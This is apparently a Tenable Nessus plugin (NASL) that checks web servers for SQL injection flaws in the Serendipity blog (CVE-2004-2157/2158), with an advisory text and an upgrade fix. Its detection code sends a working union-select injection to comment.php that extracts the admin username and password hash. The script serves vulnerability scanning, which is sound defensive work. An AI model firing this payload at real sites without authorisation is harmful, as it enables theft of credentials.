#
# This script is (C) Tenable Network Security
#


if(description)
{
 script_id(14842);
 script_version ("$Revision: 1.8 $");

 script_cve_id("CVE-2004-2157", "CVE-2004-2158");
 script_bugtraq_id(11269);
 if (defined_func("script_xref")) {
  script_xref(name:"OSVDB", value:"10370");
  script_xref(name:"OSVDB", value:"10371");
 }

 name["english"] = "Serendipity SQL Injections";
 script_name(english:name["english"]);
 
 desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to SQL
injection attacks. 

Description :

The remote version of Serendipity is vulnerable to SQL injection
issues due to a failure of the application to properly sanitize user-
supplied input. 

An attacker may exploit this flaw to issue arbitrary statements in the
remote database, and therefore bypass authorization or even overwrite
arbitrary files on the remote system

See also:

http://lists.grok.org.uk/pipermail/full-disclosure/2004-September/026955.html
http://www.s9y.org/5.html

Solution : 

Upgrade to Serendipity 0.7.0beta3 or later.

Risk factor : 

Medium / CVSS Base Score : 5
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";
 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for SQL injection vulnerability in Serendipity";
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004-2006 Tenable Network Security");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);

 script_dependencies("serendipity_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/serendipity"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
 loc = matches[2];
 req = http_get(item:string(loc, "/comment.php?serendipity[type]=trackbacks&serendipity[entry_id]=0%20and%200%20union%20select%201,2,3,4,username,password,7,8,9,0,1,2,3%20from%20serendipity_authors%20where%20authorid=1%20/*"), port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if( r == NULL )exit(0);

 if( 
  "Weblog" >< r &&
  egrep(pattern:"<b>Weblog: </b> [a-f0-9]*<br />", string:r) &&
  "0 and 0 union select 1,2,3,4,username,password,7,8,9,0,1,2,3 from serendipity_authors where authorid=1" >< r
 ) security_warning(port);
}
